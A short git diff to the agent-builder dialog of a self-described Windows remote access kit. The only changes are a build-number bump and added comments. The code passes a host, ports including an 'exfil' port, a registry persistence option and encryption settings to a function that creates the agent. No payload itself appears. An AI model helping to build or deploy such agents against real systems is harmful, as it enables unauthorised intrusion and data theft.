@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 from ..logging.logging import DNSconfigs,NetworkingConfigs
 from ..builder.agent_builder import Builder
@@ -45,10 +45,10 @@ class Ui_builder_dialog(object):
             return                                                           #Return back to calling function
         else:
             #If no error, parse host option and then create the agent
-            host = NicHandler().validate_host(self.host_combobox.currentText())
+            host = NicHandler().validate_host(self.host_combobox.currentText()) #Validate the host
             Builder().create_agent(
                 self.port_input.text(), self.stream_port_input.text(), self.exfil_port_input.text(),
-                host, self.file_name_input.text(),reg_key,perst_option,encryption_option)
+                host, self.file_name_input.text(),reg_key,perst_option,encryption_option) #
 
     def setupUi(self, builder_dialog):
         builder_dialog.setObjectName("builder_dialog")
